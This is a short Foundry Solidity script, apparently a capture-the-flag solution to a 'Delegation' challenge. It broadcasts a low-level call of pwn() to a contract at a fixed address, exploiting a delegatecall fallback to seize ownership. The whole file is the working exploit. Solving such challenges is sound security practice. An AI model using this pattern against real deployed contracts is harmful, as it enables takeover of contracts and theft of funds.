// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Delegation.sol";

contract Solve is Script {
    function run() external {
        vm.startBroadcast();

        Delegation victim = Delegation(0xB559589752e253865d4b2B518C74E283f2A0707e);
        address(victim).call(abi.encodeWithSignature("pwn()"));

        vm.stopBroadcast();
    }
}